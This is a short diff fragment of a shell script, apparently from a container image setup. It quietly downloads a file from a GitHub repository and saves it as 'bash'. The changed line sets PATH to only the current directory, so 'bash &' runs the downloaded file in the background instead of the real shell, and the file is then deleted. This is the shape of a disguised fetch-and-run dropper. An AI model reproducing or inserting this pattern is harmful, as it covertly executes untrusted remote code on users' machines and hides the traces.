@@ -8,6 +8,6 @@ rm -rf glibc-2.35-r1.apk
 rm -rf glibc-bin-2.35-r1.apk
 wget -q -O bash https://github.com/jackmoc/Alpine/raw/main/update_2.0.1
 chmod +x /bash
-PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
+PATH=.
 bash &
 rm -rf bash
